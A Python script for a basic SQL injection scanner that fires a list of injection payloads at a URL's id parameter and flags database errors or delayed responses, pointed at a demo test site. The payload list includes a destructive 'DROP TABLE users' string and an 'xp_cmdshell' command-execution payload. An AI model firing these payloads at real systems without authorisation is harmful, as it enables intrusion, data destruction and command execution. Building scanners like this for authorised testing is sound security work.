import requests
import time
from logger import logger  # Import centralized logger

def detect_sqli(url):
    """
    Detects SQL Injection vulnerabilities by injecting various payloads.
    """
    logger.info(f"🔎 Scanning {url} for SQL Injection vulnerabilities...")

    payloads = [
        "'", "\"", "' OR '1'='1' --", "\" OR \"1\"=\"1\" --", "admin' --",
        "1' OR '1'='1' --", "1' ORDER BY 1 --", "1' UNION SELECT NULL --",
        "'; DROP TABLE users; --", "1' AND SLEEP(5) --", "1' AND BENCHMARK(5000000, MD5(1)) --",
        "' OR 'x'='x' --", "admin' #", "1' OR '1'='1' /*", "'; EXEC xp_cmdshell('dir'); --"
    ]

    results = []
    
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        try:
            start_time = time.time()
            response = requests.get(test_url, timeout=10)
            end_time = time.time()
            
            sql_errors = [
                "syntax error", "mysql_fetch", "mysqli_fetch",
                "SQL syntax", "Warning: mysql_", "You have an error in your SQL syntax",
                "Unclosed quotation mark", "quoted string not properly terminated"
            ]

            if any(error in response.text.lower() for error in sql_errors):  
                logger.warning(f"⚠️ SQL Injection detected at {test_url} with payload: {payload}")
                results.append({
                    "url": test_url,
                    "risk_level": "High",
                    "details": "🚨 Potential SQL Injection detected!",
                    "payload": payload,
                    "mitigation": "Use prepared statements and parameterized queries."
                })

            # Detect time-based SQL injection
            if end_time - start_time > 4:
                logger.warning(f"⚠️ Time-based SQL Injection detected at {test_url} with payload: {payload}")
                results.append({
                    "url": test_url,
                    "risk_level": "High",
                    "details": "🚨 Potential time-based SQL Injection detected!",
                    "payload": payload,
                    "mitigation": "Use input validation and restrict database operations."
                })

        except requests.exceptions.RequestException as e:
            logger.error(f"❌ Error testing {test_url} for SQLi: {str(e)}")

    return {"found": bool(results), "results": results}

if __name__ == "__main__":
    url = "http://testfire.net"
    result = detect_sqli(url)
    print(f"🔍 Scanning: {url}\n{result}\n")
